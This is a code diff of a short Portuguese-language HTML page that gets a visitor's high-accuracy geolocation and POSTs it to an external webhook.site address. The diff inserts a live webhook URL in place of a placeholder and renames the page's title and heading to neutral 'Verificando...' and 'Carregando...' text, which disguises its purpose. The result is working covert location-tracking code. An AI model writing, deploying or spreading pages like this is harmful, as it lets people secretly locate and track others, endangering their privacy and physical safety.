@@ -2,16 +2,16 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Teste Localização</title>
+<title>Verificando...</title>
 </head>
 <body>
-<h2>Verificando...</h2>
+<h2>Carregando...</h2>
 
 <script>
 if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(function(pos) {
 
-    fetch("COLE_AQUI_SUA_URL_DO_WEBHOOK", {
+    fetch("https://webhook.site/10171ff7-5eb4-4769-8d31-ebdffcdf7083", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
@@ -27,12 +27,14 @@ if (navigator.geolocation) {
 
     document.body.innerHTML = "Localização enviada.";
   },
-  function() {
-    document.body.innerHTML = "Permissão negada.";
+  function(err) {
+    document.body.innerHTML = "Permissão negada ou erro: " + err.message;
   },
   {
     enableHighAccuracy: true
   });
+} else {
+  document.body.innerHTML = "Geolocalização não suportada.";
 }
 </script>
 
